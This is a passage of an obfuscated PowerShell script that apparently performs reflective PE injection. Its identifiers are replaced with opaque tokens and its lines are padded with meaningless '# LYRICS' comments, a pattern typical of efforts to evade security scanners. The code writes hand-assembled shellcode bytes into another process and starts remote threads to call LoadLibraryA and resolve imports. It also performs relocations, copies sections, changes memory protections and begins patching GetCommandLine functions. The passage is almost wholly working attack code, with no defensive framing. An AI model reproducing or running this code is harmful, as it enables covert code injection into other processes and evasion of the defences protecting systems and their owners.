# LYRICS498
            if (($VAR0154.CONST031.CONST121.CONST067 -band $VAR0041.CONST022) -eq $VAR0041.CONST022) {
# LYRICS499
                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST037 -Value 'Library'
            }
            elseif (($VAR0154.CONST031.CONST121.CONST067 -band $VAR0041.CONST021) -eq $VAR0041.CONST021) {
# LYRICS500
                $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST037 -Value 'Executable'
            }
            else {
                Throw "ERROR08"
            }
# LYRICS501
            return $VAR0126
        }
# LYRICS502
        Function FUN018 {
# LYRICS503
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0161,
# LYRICS504
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $VAR0162
            )
# LYRICS505
            $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
# LYRICS506
# LYRICS507
            $VAR0164 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0162)
# LYRICS508
            $VAR0165 = [UIntPtr][UInt64]([UInt64]$VAR0164.Length + 1)
            $VAR0166 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, $VAR0165, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
# LYRICS509
            if ($VAR0166 -eq [IntPtr]::Zero) {
                Throw "ERROR09"
            }
# LYRICS510
            [UIntPtr]$VAR0167 = [UIntPtr]::Zero
# LYRICS511
            $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0166, $VAR0162, $VAR0165, [Ref]$VAR0167)
# LYRICS512
            if ($Success -eq $false) {
                Throw "ERROR10"
            }
            if ($VAR0165 -ne $VAR0167) {
                Throw "ERROR11"
            }
# LYRICS513
            $VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
# LYRICS514
            $VAR0169 = $VAR0042.FUN036.Invoke($VAR0168, "LoadLibraryA") 
# LYRICS515
            [IntPtr]$VAR0181 = [IntPtr]::Zero
# LYRICS516
# LYRICS517
            if ($VAR0126.CONST032 -eq $true) {
# LYRICS518
                $VAR0170 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, $VAR0165, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
# LYRICS519
                if ($VAR0170 -eq [IntPtr]::Zero) {
                    Throw "ERROR12"
                }
# LYRICS520
                [Byte[]]$VAR0174 = 83,72,137,227,72,131,236,32,102,131,228,192,72,185
# LYRICS521
                $VAR0175 = 72,186
                $VAR0176 = 255,210,72,186
# LYRICS522
                $VAR0177 = 72,137,2,72,137,220,91,195
# LYRICS523
                $VAR0171 = $VAR0174.Length + $VAR0175.Length + $VAR0176.Length + $VAR0177.Length + ($VAR0163 * 3)
# LYRICS524
                $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
                $VAR0173 = $VAR0172
# LYRICS525
                FUN010 -Bytes $VAR0174 -VAR0129 $VAR0172
# LYRICS526
                $VAR0172 = FUN005 $VAR0172 ($VAR0174.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0166, $VAR0172, $false)
                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
# LYRICS527
                FUN010 -Bytes $VAR0175 -VAR0129 $VAR0172
                $VAR0172 = FUN005 $VAR0172 ($VAR0175.Length)
# LYRICS528
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0169, $VAR0172, $false)
                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
# LYRICS529
                FUN010 -Bytes $VAR0176 -VAR0129 $VAR0172
                $VAR0172 = FUN005 $VAR0172 ($VAR0176.Length)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0170, $VAR0172, $false)
                $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                FUN010 -Bytes $VAR0177 -VAR0129 $VAR0172
# LYRICS530
                $VAR0172 = FUN005 $VAR0172 ($VAR0177.Length)
# LYRICS531
                $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
# LYRICS532
                if ($VAR0178 -eq [IntPtr]::Zero) {
# LYRICS533
                    Throw "ERROR13"
                }
# LYRICS534
                $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
# LYRICS535
                if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                    Throw "ERROR14"
                }
# LYRICS536
                $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
# LYRICS537
                $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
                if ($VAR0144 -ne 0) {
                    Throw "ERROR15"
                }
# LYRICS538
# LYRICS539
                [IntPtr]$VAR0180 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
                $VAR0144 = $VAR0042.FUN046.Invoke($VAR0161, $VAR0170, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167)
# LYRICS540
                if ($VAR0144 -eq $false) {
                    Throw "ERROR16"
                }
                [IntPtr]$VAR0181 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0180, [Type][IntPtr])
# LYRICS541
                $VAR0042.FUN039.Invoke($VAR0161, $VAR0170, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
# LYRICS542
                $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
            }
            else {
# LYRICS543
                [IntPtr]$VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0169 -VAR0152 $VAR0166 -VAR0042 $VAR0042
# LYRICS544
                $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
                if ($VAR0144 -ne 0) {
                    Throw "ERROR17."
                }
# LYRICS545
                [Int32]$VAR0182 = 0
# LYRICS546
                $VAR0144 = $VAR0042.FUN048.Invoke($VAR0179, [Ref]$VAR0182)
# LYRICS547
                if (($VAR0144 -eq 0) -or ($VAR0182 -eq 0)) {
                    Throw "ERROR18"
                }
# LYRICS548
                [IntPtr]$VAR0181 = [IntPtr]$VAR0182
            }
# LYRICS549
            $VAR0042.FUN039.Invoke($VAR0161, $VAR0166, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
# LYRICS550
            return $VAR0181
        }
# LYRICS551
        Function FUN019 {
# LYRICS552
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0161,
# LYRICS553
                [Parameter(Position = 1, Mandatory = $true)]
                [IntPtr]
                $VAR0183,
# LYRICS554
                [Parameter(Position = 2, Mandatory = $true)]
                [IntPtr]
                $VAR0184, 
# LYRICS555
                [Parameter(Position = 3, Mandatory = $true)]
                [Bool]
                $VAR0185
            )
# LYRICS556
            $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
# LYRICS557
            [IntPtr]$VAR0186 = [IntPtr]::Zero   
# LYRICS558
            if (-not $VAR0185) {
# LYRICS559
                $VAR0187 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0184)
# LYRICS560
# LYRICS561
# LYRICS562
                $VAR0188 = [UIntPtr][UInt64]([UInt64]$VAR0187.Length + 1)
# LYRICS563
                $VAR0186 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, $VAR0188, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
# LYRICS564
                if ($VAR0186 -eq [IntPtr]::Zero) {
                    Throw "ERROR17"
                }
# LYRICS565
                [UIntPtr]$VAR0167 = [UIntPtr]::Zero
# LYRICS566
                $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0186, $VAR0184, $VAR0188, [Ref]$VAR0167)
# LYRICS567
                if ($Success -eq $false) {
                    Throw "ERROR18"
                }
                if ($VAR0188 -ne $VAR0167) {
                    Throw "ERROR19"
                }
            }
# LYRICS568
            else {
                $VAR0186 = $VAR0184
            }
# LYRICS569
# LYRICS570
            $VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
# LYRICS571
            $VAR0058 = $VAR0042.FUN036.Invoke($VAR0168, $VAR0312) 
# LYRICS572
# LYRICS573
            $VAR0189 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UInt64][UInt64]$VAR0163, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
# LYRICS574
            if ($VAR0189 -eq [IntPtr]::Zero) {
# LYRICS575
                Throw "ERROR20"
            }
# LYRICS576
# LYRICS577
# LYRICS578
            [Byte[]]$VAR0190 = @()
            if ($VAR0126.CONST032 -eq $true) {
                $VAR01901 = 83,72,137,227,72,131,236,32,102,131,228,192,72,185
# LYRICS579
                $VAR01902 = 72,186
                $VAR01903 = 72,184
# LYRICS580
                $VAR01904 = 255,208,72,185
                $VAR01905 = 72,137,1,72,137,220,91,195
            }
            else {
                $VAR01901 = 83,137,227,131,228,192,184
                $VAR01902 = 185
# LYRICS581
                $VAR01903 = 81,80,184
# LYRICS582
                $VAR01904 = 255,208,185
                $VAR01905 = 137,1,137,220,91,195
            }
            $VAR0171 = $VAR01901.Length + $VAR01902.Length + $VAR01903.Length + $VAR01904.Length + $VAR01905.Length + ($VAR0163 * 4)
# LYRICS583
            $VAR0172 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0171)
            $VAR0173 = $VAR0172
# LYRICS584
            FUN010 -Bytes $VAR01901 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01901.Length)
# LYRICS585
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0183, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
# LYRICS586
            FUN010 -Bytes $VAR01902 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01902.Length)
# LYRICS587
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0186, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01903 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01903.Length)
# LYRICS588
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0058, $VAR0172, $false)
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01904 -VAR0129 $VAR0172
# LYRICS589
            $VAR0172 = FUN005 $VAR0172 ($VAR01904.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0189, $VAR0172, $false)
# LYRICS590
            $VAR0172 = FUN005 $VAR0172 ($VAR0163)
            FUN010 -Bytes $VAR01905 -VAR0129 $VAR0172
            $VAR0172 = FUN005 $VAR0172 ($VAR01905.Length)
# LYRICS591
            $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, [IntPtr]::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
# LYRICS592
            if ($VAR0178 -eq [IntPtr]::Zero) {
                Throw "ERROR21"
            }
            [UIntPtr]$VAR0167 = [UIntPtr]::Zero
# LYRICS593
            $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
# LYRICS594
            if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                Throw "ERROR22"
            }
# LYRICS595
            $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
# LYRICS596
            $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
            if ($VAR0144 -ne 0) {
                Throw "ERROR23"
            }
# LYRICS597
# LYRICS598
            [IntPtr]$VAR0180 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($VAR0163)
# LYRICS599
            $VAR0144 = $VAR0042.FUN046.Invoke($VAR0161, $VAR0189, $VAR0180, [UIntPtr][UInt64]$VAR0163, [Ref]$VAR0167)
# LYRICS600
            if (($VAR0144 -eq $false) -or ($VAR0167 -eq 0)) {
                Throw "ERROR24"
            }
            [IntPtr]$VAR0191 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0180, [Type][IntPtr])
# LYRICS601
# LYRICS602
            $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
# LYRICS603
            $VAR0042.FUN039.Invoke($VAR0161, $VAR0189, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
# LYRICS604
            if (-not $VAR0185) {
# LYRICS605
                $VAR0042.FUN039.Invoke($VAR0161, $VAR0186, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
            }
# LYRICS606
            return $VAR0191
        }
# LYRICS607
# LYRICS608
        Function FUN020 {
# LYRICS609
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Byte[]]
                $VAR001,
# LYRICS610
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0126,
# LYRICS611
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0042,
# LYRICS612
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR010
            )
# LYRICS613
            for ( $i = 0; $i -lt $VAR0126.CONST031.CONST121.CONST072; $i++) {
# LYRICS614
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST036) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST142)))
                $VAR0192 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0160, [Type]$VAR010.CONST142)
# LYRICS615
# LYRICS616
# LYRICS617
                [IntPtr]$VAR0193 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0192.CONST074))
# LYRICS618
# LYRICS619
# LYRICS620
# LYRICS621
# LYRICS622
                $VAR0194 = $VAR0192.CONST144
# LYRICS623
                if ($VAR0192.CONST145 -eq 0) {
# LYRICS624
                    $VAR0194 = 0
                }
# LYRICS625
                if ($VAR0194 -gt $VAR0192.CONST143) {
# LYRICS626
                    $VAR0194 = $VAR0192.CONST143
                }
# LYRICS627
                if ($VAR0194 -gt 0) {
                    FUN009 -VAR0125 "FUN020::MarshalCopy" -VAR0126 $VAR0126 -VAR0127 $VAR0193 -Size $VAR0194 | Out-Null
# LYRICS628
                    [System.Runtime.InteropServices.Marshal]::Copy($VAR001, [Int32]$VAR0192.CONST145, $VAR0193, $VAR0194)
# LYRICS629
                }
# LYRICS630
# LYRICS631
                if ($VAR0192.CONST144 -lt $VAR0192.CONST143) {
                    $VAR0195 = $VAR0192.CONST143 - $VAR0194
# LYRICS632
                    [IntPtr]$VAR0127 = [IntPtr](FUN005 ([Int64]$VAR0193) ([Int64]$VAR0194))
# LYRICS633
                    FUN009 -VAR0125 "FUN020::FUN034" -VAR0126 $VAR0126 -VAR0127 $VAR0127 -Size $VAR0195 | Out-Null
# LYRICS634
                    $VAR0042.FUN034.Invoke($VAR0127, 0, [IntPtr]$VAR0195) | Out-Null
                }
            }
        }
# LYRICS635
# LYRICS636
        Function FUN021 {
# LYRICS637
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $VAR0126,
# LYRICS638
                [Parameter(Position = 1, Mandatory = $true)]
                [Int64]
                $VAR0196,
# LYRICS639
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041,
# LYRICS640
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR010
            )
# LYRICS641
            [Int64]$VAR0197 = 0
# LYRICS642
            $VAR0198 = $true 
# LYRICS643
            [UInt32]$VAR0199 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST150)
# LYRICS644
# LYRICS645
            if (($VAR0196 -eq [Int64]$VAR0126.CONST039) `
                    -or ($VAR0126.CONST031.CONST122.CONST112.Size -eq 0)) {
# LYRICS646
                return
            }
# LYRICS647
# LYRICS648
            elseif ((FUN006 ($VAR0196) ($VAR0126.CONST039)) -eq $true) {
# LYRICS649
                $VAR0197 = FUN004 ($VAR0196) ($VAR0126.CONST039)
                $VAR0198 = $false
            }
            elseif ((FUN006 ($VAR0126.CONST039) ($VAR0196)) -eq $true) {
# LYRICS650
                $VAR0197 = FUN004 ($VAR0126.CONST039) ($VAR0196)
            }
# LYRICS651
# LYRICS652
            [IntPtr]$VAR0200 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST112.CONST074))
# LYRICS653
            while ($true) {
# LYRICS654
                $VAR0201 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0200, [Type]$VAR010.CONST150)
# LYRICS655
                if ($VAR0201.CONST151 -eq 0) {
                    break
                }
# LYRICS656
                [IntPtr]$VAR0202 = [IntPtr](FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0201.CONST074))
# LYRICS657
                $VAR0203 = ($VAR0201.CONST151 - $VAR0199) / 2
# LYRICS658
# LYRICS659
                for ($i = 0; $i -lt $VAR0203; $i++) {
# LYRICS660
                    $VAR0204 = [IntPtr](FUN005 ([IntPtr]$VAR0200) ([Int64]$VAR0199 + (2 * $i)))
# LYRICS661
                    [UInt16]$VAR0205 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0204, [Type][UInt16])
# LYRICS662
# LYRICS663
                    [UInt16]$VAR0206 = $VAR0205 -band 0x0FFF
# LYRICS664
                    [UInt16]$VAR0207 = $VAR0205 -band 0xF000
                    for ($j = 0; $j -lt 12; $j++) {
                        $VAR0207 = [Math]::Floor($VAR0207 / 2)
                    }
# LYRICS665
# LYRICS666
# LYRICS667
# LYRICS668
                    if (($VAR0207 -eq $VAR0041.CONST013) `
                            -or ($VAR0207 -eq $VAR0041.CONST014)) {
# LYRICS669
# LYRICS670
                        [IntPtr]$VAR0208 = [IntPtr](FUN005 ([Int64]$VAR0202) ([Int64]$VAR0206))
# LYRICS671
                        [IntPtr]$VAR0209 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0208, [Type][IntPtr])
# LYRICS672
                        if ($VAR0198 -eq $true) {
# LYRICS673
                            [IntPtr]$VAR0209 = [IntPtr](FUN005 ([Int64]$VAR0209) ($VAR0197))
                        }
                        else {
# LYRICS674
                            [IntPtr]$VAR0209 = [IntPtr](FUN004 ([Int64]$VAR0209) ($VAR0197))
                        }
# LYRICS675
                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0209, $VAR0208, $false) | Out-Null
                    }
                    elseif ($VAR0207 -ne $VAR0041.CONST012) {
# LYRICS676
                        Throw "ERROR25: $VAR0207, ERROR26: $VAR0205"
                    }
                }
# LYRICS677
                $VAR0200 = [IntPtr](FUN005 ([Int64]$VAR0200) ([Int64]$VAR0201.CONST151))
            }
        }
# LYRICS678
# LYRICS679
        Function FUN022 {
# LYRICS680
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $VAR0126,
# LYRICS681
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,
# LYRICS682
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR010,
# LYRICS683
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR0041,
# LYRICS684
                [Parameter(Position = 4, Mandatory = $false)]
                [IntPtr]
                $VAR0161
            )
# LYRICS685
            $VAR0210 = $false
            if ($VAR0126.VAR0263 -ne $VAR0126.CONST039) {
# LYRICS686
                $VAR0210 = $true
            }
# LYRICS687
            if ($VAR0126.CONST031.CONST122.CONST108.Size -gt 0) {
# LYRICS688
                [IntPtr]$VAR0211 = FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST108.CONST074)
# LYRICS689
                while ($true) {
# LYRICS690
                    $VAR0212 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0211, [Type]$VAR010.CONST152)
# LYRICS691
# LYRICS692
                    if ($VAR0212.CONST067 -eq 0 `
                            -and $VAR0212.CONST154 -eq 0 `
                            -and $VAR0212.CONST153 -eq 0 `
                            -and $VAR0212.Name -eq 0 `
                            -and $VAR0212.CONST071 -eq 0) {
# LYRICS693
                        break
                    }
# LYRICS694
                    $VAR0213 = [IntPtr]::Zero
# LYRICS695
                    $VAR0162 = (FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0212.Name))
                    $VAR0164 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0162)
# LYRICS696
# LYRICS697
                    if ($VAR0210 -eq $true) {
# LYRICS698
                        $VAR0213 = FUN018 -VAR0161 $VAR0161 -VAR0162 $VAR0162
                    }
                    else {
                        $VAR0213 = $VAR0042.FUN035.Invoke($VAR0164)
# LYRICS699
                    }
# LYRICS700
                    if (($VAR0213 -eq $null) -or ($VAR0213 -eq [IntPtr]::Zero)) {
# LYRICS701
                        throw "ERROR28: $VAR0164"
                    }
# LYRICS702
# LYRICS703
                    [IntPtr]$VAR0214 = FUN005 ($VAR0126.VAR0263) ($VAR0212.CONST154)
# LYRICS704
                    [IntPtr]$VAR0215 = FUN005 ($VAR0126.VAR0263) ($VAR0212.CONST067) 
# LYRICS705
                    [IntPtr]$VAR0216 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0215, [Type][IntPtr])
# LYRICS706
                    while ($VAR0216 -ne [IntPtr]::Zero) {
# LYRICS707
                        $VAR0185 = $false
                        [IntPtr]$VAR0217 = [IntPtr]::Zero
# LYRICS708
# LYRICS709
# LYRICS710
                        [IntPtr]$VAR0218 = [IntPtr]::Zero
# LYRICS711
                        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$VAR0216 -lt 0) {
                            [IntPtr]$VAR0217 = [IntPtr]$VAR0216 -band 0xffff 
                            $VAR0185 = $true
# LYRICS712
                        }
                        elseif ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$VAR0216 -lt 0) {
# LYRICS713
                            [IntPtr]$VAR0217 = [Int64]$VAR0216 -band 0xffff 
                            $VAR0185 = $true
                        }
                        else {
                            [IntPtr]$VAR0219 = FUN005 ($VAR0126.VAR0263) ($VAR0216)
# LYRICS714
                            $VAR0219 = FUN005 $VAR0219 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                            $VAR0220 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0219)
# LYRICS715
                            $VAR0217 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($VAR0220)
                        }
# LYRICS716
                        if ($VAR0210 -eq $true) {
# LYRICS717
                            [IntPtr]$VAR0218 = FUN019 -VAR0161 $VAR0161 -VAR0183 $VAR0213 -VAR0184 $VAR0217 -VAR0185 $VAR0185
                        }
                        else {
                            [IntPtr]$VAR0218 = $VAR0042.FUN037.Invoke($VAR0213, $VAR0217)
                        }
# LYRICS718
                        if ($VAR0218 -eq $null -or $VAR0218 -eq [IntPtr]::Zero) {
# LYRICS719
                            if ($VAR0185) {
                                Throw "ERROR30: $VAR0217 $VAR0164"
                            }
                            else {
                                Throw "ERROR31: $VAR0220 $VAR0164"
                            }
                        }
# LYRICS720
                        [System.Runtime.InteropServices.Marshal]::StructureToPtr($VAR0218, $VAR0214, $false)
# LYRICS721
                        $VAR0214 = FUN005 ([Int64]$VAR0214) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
# LYRICS722
                        [IntPtr]$VAR0215 = FUN005 ([Int64]$VAR0215) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
# LYRICS723
                        [IntPtr]$VAR0216 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0215, [Type][IntPtr])
# LYRICS724
# LYRICS725
# LYRICS726
                        if ((-not $VAR0185) -and ($VAR0217 -ne [IntPtr]::Zero)) {
# LYRICS727
                            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($VAR0217)
                            $VAR0217 = [IntPtr]::Zero
                        }
                    }
# LYRICS728
                    $VAR0211 = FUN005 ($VAR0211) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST152))
                }
            }
        }
# LYRICS729
        Function FUN023 {
# LYRICS730
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [UInt32]
                $VAR0221
            )
# LYRICS731
            $VAR0222 = 0x0
            if (($VAR0221 -band $VAR0041.CONST016) -gt 0) {
# LYRICS732
                if (($VAR0221 -band $VAR0041.CONST017) -gt 0) {
# LYRICS733
                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
                        $VAR0222 = $VAR0041.CONST008
                    }
                    else {
                        $VAR0222 = $VAR0041.CONST009
                    }
                }
                else {
                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
# LYRICS734
                        $VAR0222 = $VAR0041.CONST010
                    }
                    else {
                        $VAR0222 = $VAR0041.CONST007
                    }
                }
            }
            else {
                if (($VAR0221 -band $VAR0041.CONST017) -gt 0) {
                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
# LYRICS735
                        $VAR0222 = $VAR0041.CONST005
                    }
                    else {
                        $VAR0222 = $VAR0041.CONST004
                    }
                }
                else {
                    if (($VAR0221 -band $VAR0041.CONST018) -gt 0) {
# LYRICS736
                        $VAR0222 = $VAR0041.CONST006
                    }
                    else {
                        $VAR0222 = $VAR0041.CONST003
# LYRICS737
                    }
                }
            }
# LYRICS738
            if (($VAR0221 -band $VAR0041.CONST019) -gt 0) {
# LYRICS739
                $VAR0222 = $VAR0222 -bor $VAR0041.CONST011
            }
# LYRICS740
            return $VAR0222
        }
# LYRICS741
        Function FUN024 {
# LYRICS742
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $VAR0126,
# LYRICS743
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,
# LYRICS744
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041,
# LYRICS745
                [Parameter(Position = 3, Mandatory = $true)]
                [System.Object]
                $VAR010
            )
# LYRICS746
# LYRICS747
            for ( $i = 0; $i -lt $VAR0126.CONST031.CONST121.CONST072; $i++) {
# LYRICS748
                [IntPtr]$VAR0160 = [IntPtr](FUN005 ([Int64]$VAR0126.CONST036) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST142)))
# LYRICS749
                $VAR0192 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0160, [Type]$VAR010.CONST142)
# LYRICS750
                [IntPtr]$VAR0223 = FUN005 ($VAR0126.VAR0263) ($VAR0192.CONST074)
# LYRICS751
                [UInt32]$VAR0224 = FUN023 $VAR0192.CONST067
                [UInt32]$VAR0225 = $VAR0192.CONST143
# LYRICS752
                [UInt32]$VAR0226 = 0
                FUN009 -VAR0125 "FUN024::FUN040" -VAR0126 $VAR0126 -VAR0127 $VAR0223 -Size $VAR0225 | Out-Null
# LYRICS753
                $Success = $VAR0042.FUN040.Invoke($VAR0223, $VAR0225, $VAR0224, [Ref]$VAR0226)
                if ($Success -eq $false) {
                    Throw "ERROR32"
                }
            }
        }
# LYRICS754
# LYRICS755
# LYRICS756
        Function FUN025 {
# LYRICS757
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [System.Object]
                $VAR0126,
# LYRICS758
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,
# LYRICS759
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041,
# LYRICS760
                [Parameter(Position = 3, Mandatory = $true)]
                [String]
                $VAR0227,
# LYRICS761
                [Parameter(Position = 4, Mandatory = $true)]
                [IntPtr]
                $VAR0228
            )
# LYRICS762
# LYRICS763
            $VAR0229 = @()
# LYRICS764
            $VAR0163 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
# LYRICS765
            [UInt32]$VAR0226 = 0
# LYRICS766
            [IntPtr]$VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
            if ($VAR0168 -eq [IntPtr]::Zero) {
                throw "ERROR33"
            }
# LYRICS767
            [IntPtr]$VAR0230 = $VAR0042.FUN041.Invoke("KernelBase.dll")
# LYRICS768
            if ($VAR0230 -eq [IntPtr]::Zero) {
                throw "ERROR34"
            }
# LYRICS769
# LYRICS770
# LYRICS771
# LYRICS772
            $VAR0231 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($VAR0227)
# LYRICS773
            $VAR0232 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($VAR0227)
# LYRICS774
            [IntPtr]$VAR0233 = $VAR0042.FUN036.Invoke($VAR0230, "GetCommandLineA")
# LYRICS775
            [IntPtr]$VAR0234 = $VAR0042.FUN036.Invoke($VAR0230, "GetCommandLineW")
# LYRICS776
            if ($VAR0233 -eq [IntPtr]::Zero -or $VAR0234 -eq [IntPtr]::Zero) {
# LYRICS777
                throw "ERROR36: $(FUN008 $VAR0233). ERROR37: $(FUN008 $VAR0234)"
            }
# LYRICS778
# LYRICS779
            [Byte[]]$VAR0235 = @()
# LYRICS780
            if ($VAR0163 -eq 8) {
# LYRICS781
                $VAR0235 += 0x48 
            }
            $VAR0235 += 0xb8
# LYRICS782
            [Byte[]]$VAR0236 = 195
            $VAR0237 = $VAR0235.Length + $VAR0163 + $VAR0236.Length
# LYRICS783
